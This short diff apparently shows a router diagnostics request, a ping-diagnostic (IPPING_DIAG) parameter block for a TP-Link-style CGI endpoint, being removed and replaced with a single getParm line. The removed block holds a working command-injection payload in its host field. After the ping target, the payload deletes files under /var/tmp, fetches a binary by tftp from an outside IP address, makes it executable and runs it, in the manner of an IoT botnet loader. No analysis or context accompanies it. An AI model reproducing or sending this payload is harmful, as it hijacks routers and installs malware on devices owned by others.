@@ -1,7 +1,1 @@
-[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6
-dataBlockSize=64
-timeout=1
-numberOfRepetitions=1
-host=1.1.1.1;rm -rf /var/tmp/*;tftp -g -r l -l/var/tmp/l 45.95.146.93; chmod +x /var/tmp/l; /var/tmp/l;
-X_TP_ConnName=ewan_pppoe
-diagnosticsState=Requested
+[/cgi/getParm#0,0,0,0,0,0#0,0,0,0,0,0]0,0
